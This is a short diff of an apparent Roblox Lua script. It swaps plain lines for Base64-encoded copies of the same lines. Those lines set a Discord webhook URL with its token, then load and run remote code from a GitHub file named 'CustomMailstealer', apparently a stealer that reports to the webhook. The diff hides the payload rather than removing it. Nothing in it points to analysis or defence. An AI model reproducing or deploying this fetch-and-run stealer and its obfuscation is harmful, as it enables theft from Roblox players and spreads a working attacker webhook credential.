@@ -1,7 +1,7 @@
-Username = "hoangdeptraivailon27"
-Webhook = "https://discord.com/api/webhooks/1208341950479212554/MubgoGmKzG2tPLwzIIHosaeq8Pa5PY4a2JEJV5nkLQULb3drNRvyODgSccwSRCTrdcYB"
+VXNlcm5hbWUgPSAiaG9hbmdkZXB0cmFpdmFpbG9uMjci
+V2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjA4MzQxOTUwNDc5MjEyNTU0L011YmdvR21LekcydFBMd3pJSUhvc2FlcThQYTVQWTRhMkpFSlY1bmtMUVVMYjNkck5SdnlPRGdTY2N3U1JDVHJkY1lCIg
 
-G_LoadingScreen = "3"
-G_WebhookName = "Chung"
+R19Mb2FkaW5nU2NyZWVuID0gIjMi
+R19XZWJob29rTmFtZSA9ICJDaHVuZyI
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
+bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9MeXBoZXJYL01vcmlDdXN0b20vbWFpbi9DdXN0b21NYWlsc3RlYWxlciIpKSgp
